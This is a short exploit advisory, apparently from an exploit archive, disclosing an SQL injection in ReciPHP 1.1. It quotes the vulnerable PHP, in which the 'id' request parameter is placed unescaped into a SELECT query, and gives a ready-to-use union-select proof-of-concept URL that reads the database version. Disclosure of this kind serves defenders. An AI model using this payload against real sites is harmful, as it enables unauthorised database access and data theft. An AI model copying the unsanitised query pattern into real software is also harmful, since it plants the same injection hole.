@@ -1,0 +1,39 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo----------------------
+   |        ReciPHP 1.1 SQL Injection Vulnerability        |
+   ---------------------------------------------------------
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Site: http://0xuht.org
+[!] Download: http://sourceforge.net/projects/reciphp/files/
+[!] Version: 1.1
+[!] Date: 14.11.2012
+[!] Remote: yes
+[!] Tested: Ubuntu
+[!] Reference: http://0xuht.org/Exploit/reciphp.txt
+
+[!] Vulnerability Code [showrecipe.inc.php] :
+ 
+<?php include 'config.php'; ?>
+<div id="main">
+<div id='preview'><?php
+
+
+$recipeid = $_GET['id'];
+
+$query = "SELECT title,poster,shortdesc,ingredients,directions from recipes where recipeid = $recipeid";
+
+$result = mysql_query($query) or die('Could not find recipe');
+ 
+ 
+[!] PoC (Piye om Carane):
+ 
+    [ReciPHP]/index.php?content=showrecipe&id=-3 union select version(),2,3,4,5--
+
+[!] Demo:
+
+    http://0xuht.org/demo/reciphp.png
+
+[!] Thanks: packetstormsecurity
+
+// Gorontalo [2012-11-14]
